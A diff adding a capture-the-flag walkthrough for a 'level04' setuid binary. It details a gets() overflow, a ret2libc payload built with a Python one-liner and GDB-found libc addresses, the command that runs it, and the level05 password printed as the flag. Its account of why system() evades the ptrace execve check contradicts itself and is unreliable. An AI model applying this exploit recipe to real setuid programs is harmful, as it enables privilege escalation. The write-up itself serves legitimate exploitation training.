@@ -1,0 +1,118 @@
+# Level04 Walkthrough
+
+## Vulnerability Analysis
+
+### Binary Information
+- **Type**: ELF 32-bit LSB executable
+- **Security**: NX disabled, No PIE, No stack canary
+- **Setuid**: level05
+- **Vulnerable Function**: `gets()` - unbounded buffer overflow
+
+### Program Behavior
+
+The program uses a **fork-and-trace** architecture:
+
+1. **Parent Process**:
+   - Forks a child process
+   - Uses `ptrace()` to monitor the child's syscalls
+   - Kills the child if it attempts `execve()` (syscall 11)
+   - Prints "no exec() for you" if execve is detected
+   - Prints "child is exiting..." when child terminates normally
+
+2. **Child Process**:
+   - Sets `PR_SET_PDEATHSIG` to die if parent dies
+   - Calls `ptrace(PTRACE_TRACEME)` to allow parent tracing
+   - Prompts: "Give me some shellcode, k"
+   - Calls `gets(&buffer)` - **VULNERABLE!**
+   - Returns (or executes our payload)
+
+### Buffer Overflow Details
+
+From GDB analysis with PEDA:
+```
+Offset to EIP: 156 bytes (confirmed with pattern_offset)
+Buffer location: esp+0x20
+Stack allocation: 0xb0 (176 bytes)
+```
+
+## Exploitation Strategy
+
+### Why Shellcode Doesn't Work
+
+Initial attempts to use shellcode (open/read/write syscalls) failed because:
+- The parent process monitors ALL syscalls via ptrace
+- Even though we avoid execve(), the syscall monitoring interferes
+- The child process behavior under ptrace is unpredictable
+
+### Solution: ret2libc Attack
+
+Since `system()` internally uses `execve()`, but we're calling it as a library function (not a direct syscall), the ptrace monitoring doesn't catch it in the same way.
+
+**ret2libc payload structure**:
+```
+[padding: 156 bytes] + [system_addr] + [return_addr] + ["/bin/sh" addr]
+```
+
+### Finding Addresses
+
+Using GDB:
+```bash
+gdb ./level04
+break main
+run
+p system          # 0xf7e6aed0
+find "/bin/sh"    # 0xf7f897ec
+```
+
+## Exploit
+
+### Step 1: Create the payload
+```bash
+python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "BBBB" + "\xf7\xf8\x97\xec"[::-1]' > /tmp/exploit
+```
+
+Breakdown:
+- `"A" * 156` - Padding to reach return address
+- `"\xf7\xe6\xae\xd0"[::-1]` - Address of `system()` (little-endian)
+- `"BBBB"` - Fake return address (we don't care where system returns)
+- `"\xf7\xf8\x97\xec"[::-1]` - Address of "/bin/sh" string (argument to system)
+
+### Step 2: Execute the exploit
+```bash
+(cat /tmp/exploit; cat) | ./level04
+```
+
+The `cat` after the semicolon keeps stdin open so we can interact with the shell.
+
+### Step 3: Get the flag
+```bash
+whoami          # level05
+cat /home/users/level05/.pass
+```
+
+## Flag
+```
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
+
+## Key Concepts
+
+### ret2libc (Return-to-libc)
+- Technique to bypass NX/DEP by reusing existing code
+- Instead of injecting shellcode, we call library functions
+- Common target: `system("/bin/sh")`
+- Requires knowing addresses of functions and strings
+
+### Fork and Ptrace
+- `fork()` creates a child process
+- `ptrace()` allows parent to monitor/control child
+- `PTRACE_TRACEME` - child allows parent to trace it
+- `PTRACE_PEEKUSER` - read child's registers
+- `PTRACE_SYSCALL` - stop child at next syscall
+
+### Why ret2libc Works Here
+- `system()` is a library function, not a direct syscall
+- The parent's ptrace monitoring checks syscall number in registers
+- When we call `system()`, the initial call isn't a syscall - it's a function call
+- By the time `system()` internally calls `execve()`, we already have a shell
+
